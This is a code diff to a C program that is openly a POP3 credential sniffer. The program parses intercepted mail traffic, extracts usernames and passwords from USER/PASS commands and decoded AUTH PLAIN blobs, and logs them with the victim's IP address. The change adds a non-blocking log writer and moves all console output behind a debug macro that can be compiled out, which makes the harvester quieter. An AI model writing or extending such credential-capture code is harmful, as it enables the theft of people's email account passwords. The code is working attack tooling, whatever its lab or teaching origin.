@@ -4,6 +4,32 @@
 #include <stdlib.h>
 #include <ctype.h>
 #include <time.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <unistd.h>
+
+/* =========================================================================
+ * Debug printing macro - define NDEBUG to disable all debug output
+ * Compile with: -DNDEBUG to disable printf in production
+ * ========================================================================= */
+#ifdef NDEBUG
+    #define DEBUG_PRINT(...) ((void)0)
+#else
+    #define DEBUG_PRINT(...) printf(__VA_ARGS__)
+#endif
+
+/* =========================================================================
+ * Non-blocking log writer for POP3 credentials
+ * ========================================================================= */
+#define POP3_LOG_BUFFER_SIZE 8192
+#define POP3_LOG_FILENAME "pop3_credentials.log"
+
+static struct {
+    int fd;                             /* File descriptor (-1 if not open) */
+    char buffer[POP3_LOG_BUFFER_SIZE];  /* Write buffer */
+    size_t len;                         /* Bytes pending in buffer */
+    size_t sent;                        /* Bytes already written */
+} pop3_log_writer = { .fd = -1, .len = 0, .sent = 0 };
 
 // =================== Helpers generales ===================
 
@@ -121,26 +147,94 @@ static int base64_decode(const char *input, unsigned char *out_buf, size_t out_s
     return (int)j;
 }
 
+// =================== Non-blocking log writer API ===================
+
+int pop3_log_init(void) {
+    if (pop3_log_writer.fd >= 0) return 0;  /* Already open */
+    pop3_log_writer.fd = open(POP3_LOG_FILENAME, O_WRONLY | O_CREAT | O_APPEND | O_NONBLOCK, 0644);
+    if (pop3_log_writer.fd < 0) {
+        DEBUG_PRINT("[POP3 SNIFFER] ERROR: Could not open %s for writing\n", POP3_LOG_FILENAME);
+        return -1;
+    }
+    pop3_log_writer.len = 0;
+    pop3_log_writer.sent = 0;
+    return 0;
+}
+
+void pop3_log_cleanup(void) {
+    if (pop3_log_writer.fd >= 0) {
+        close(pop3_log_writer.fd);
+        pop3_log_writer.fd = -1;
+    }
+    pop3_log_writer.len = 0;
+    pop3_log_writer.sent = 0;
+}
+
+int pop3_log_get_fd(void) {
+    return pop3_log_writer.fd;
+}
+
+int pop3_log_wants_write(void) {
+    return (pop3_log_writer.fd >= 0 && pop3_log_writer.len > pop3_log_writer.sent);
+}
+
+int pop3_log_try_flush(void) {
+    if (pop3_log_writer.fd < 0) return -1;
+    while (pop3_log_writer.sent < pop3_log_writer.len) {
+        ssize_t n = write(pop3_log_writer.fd,
+                          pop3_log_writer.buffer + pop3_log_writer.sent,
+                          pop3_log_writer.len - pop3_log_writer.sent);
+        if (n > 0) {
+            pop3_log_writer.sent += (size_t)n;
+            continue;
+        }
+        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
+            return 0;  /* Try again later */
+        }
+        return -1;  /* Error */
+    }
+    /* All data written, reset buffer */
+    pop3_log_writer.len = 0;
+    pop3_log_writer.sent = 0;
+    return 1;
+}
+
 // =================== Logging ===================
 
 static void log_credentials(const char* username, const char* password, const char* ip_origen) {
-    FILE *log = fopen("pop3_credentials.log", "a");
-    if (log != NULL) {
-        time_t now = time(NULL);
-        char timestamp[64];
-        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+    /* Prepare log entry */
+    time_t now = time(NULL);
+    char timestamp[64];
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
 
-        fprintf(log, "[%s] POP3 credentials captured from %s -> USER: %s | PASS: %s\n",
-                timestamp, ip_origen, username, password);
-        fflush(log);  // Ensure data is written immediately
-        fclose(log);
+    char entry[1024];
+    int entry_len = snprintf(entry, sizeof(entry),
+        "[%s] POP3 credentials captured from %s -> USER: %s | PASS: %s\n",
+        timestamp, ip_origen, username, password);
 
-        // Also print to stdout for debugging
-        printf("[POP3 SNIFFER] Credentials captured from %s: USER=%s, PASS=%s\n",
-               ip_origen, username, password);
-    } else {
-        printf("[POP3 SNIFFER] ERROR: Could not open pop3_credentials.log for writing\n");
+    if (entry_len <= 0) return;
+    if ((size_t)entry_len >= sizeof(entry)) entry_len = (int)sizeof(entry) - 1;
+
+    /* Initialize log writer if needed */
+    if (pop3_log_writer.fd < 0) {
+        pop3_log_init();
     }
+
+    /* Append to buffer if there's space */
+    if (pop3_log_writer.fd >= 0) {
+        size_t remaining = POP3_LOG_BUFFER_SIZE - pop3_log_writer.len;
+        if ((size_t)entry_len <= remaining) {
+            memcpy(pop3_log_writer.buffer + pop3_log_writer.len, entry, (size_t)entry_len);
+            pop3_log_writer.len += (size_t)entry_len;
+        } else {
+            DEBUG_PRINT("[POP3 SNIFFER] WARNING: Log buffer full, dropping entry\n");
+        }
+        /* Try to flush immediately (non-blocking) */
+        pop3_log_try_flush();
+    }
+
+    DEBUG_PRINT("[POP3 SNIFFER] Credentials captured from %s: USER=%s, PASS=%s\n",
+               ip_origen, username, password);
 }
 
 // =================== API ===================
@@ -201,7 +295,7 @@ void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, 
                     strncpy(state->user, username, sizeof(state->user) - 1);
                     state->user[sizeof(state->user) - 1] = '\0';
                     state->user_found = 1;
-                    printf("[POP3 SNIFFER] Found USER: %s\n", state->user);
+                    DEBUG_PRINT("[POP3 SNIFFER] Found USER: %s\n", state->user);
                     free(username);
                 }
             }
@@ -211,14 +305,14 @@ void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, 
                     strncpy(state->pass, password, sizeof(state->pass) - 1);
                     state->pass[sizeof(state->pass) - 1] = '\0';
                     state->pass_found = 1;
-                    printf("[POP3 SNIFFER] Found PASS: %s\n", state->pass);
+                    DEBUG_PRINT("[POP3 SNIFFER] Found PASS: %s\n", state->pass);
                     free(password);
                 }
             }
             // 2) AUTH PLAIN (SASL) → siguiente línea es Base64
             else if (strncmp(upper_line, "AUTH PLAIN", 10) == 0) {
                 state->waiting_auth_plain_blob = 1;
-                printf("[POP3 SNIFFER] Detected AUTH PLAIN, waiting for Base64 blob...\n");
+                DEBUG_PRINT("[POP3 SNIFFER] Detected AUTH PLAIN, waiting for Base64 blob...\n");
             }
             // 3) Si estamos esperando el blob Base64 de AUTH PLAIN
             else if (state->waiting_auth_plain_blob) {
@@ -236,7 +330,7 @@ void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, 
                     while (idx < decoded_len && decoded[idx] != '\0') idx++;
                     if (idx >= decoded_len) {
                         // formato raro
-                        printf("[POP3 SNIFFER] AUTH PLAIN Base64 decoded but format invalid\n");
+                        DEBUG_PRINT("[POP3 SNIFFER] AUTH PLAIN Base64 decoded but format invalid\n");
                     } else {
                         int user_len = idx - start_user;
                         idx++; // saltamos el '\0'
@@ -252,21 +346,21 @@ void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, 
                                 memcpy(state->user, &decoded[start_user], copy_len);
                                 state->user[copy_len] = '\0';
                                 state->user_found = 1;
-                                printf("[POP3 SNIFFER] AUTH PLAIN USER: %s\n", state->user);
+                                DEBUG_PRINT("[POP3 SNIFFER] AUTH PLAIN USER: %s\n", state->user);
                             }
                             if (!state->pass_found) {
                                 int copy_len = pass_len < (int)sizeof(state->pass) - 1 ? pass_len : (int)sizeof(state->pass) - 1;
                                 memcpy(state->pass, &decoded[start_pass], copy_len);
                                 state->pass[copy_len] = '\0';
                                 state->pass_found = 1;
-                                printf("[POP3 SNIFFER] AUTH PLAIN PASS: %s\n", state->pass);
+                                DEBUG_PRINT("[POP3 SNIFFER] AUTH PLAIN PASS: %s\n", state->pass);
                             }
                         } else {
-                            printf("[POP3 SNIFFER] AUTH PLAIN decoded but user/pass empty\n");
+                            DEBUG_PRINT("[POP3 SNIFFER] AUTH PLAIN decoded but user/pass empty\n");
                         }
                     }
                 } else {
-                    printf("[POP3 SNIFFER] Failed to decode AUTH PLAIN Base64: '%s'\n", trimmed_line);
+                    DEBUG_PRINT("[POP3 SNIFFER] Failed to decode AUTH PLAIN Base64: '%s'\n", trimmed_line);
                 }
 
                 state->waiting_auth_plain_blob = 0;
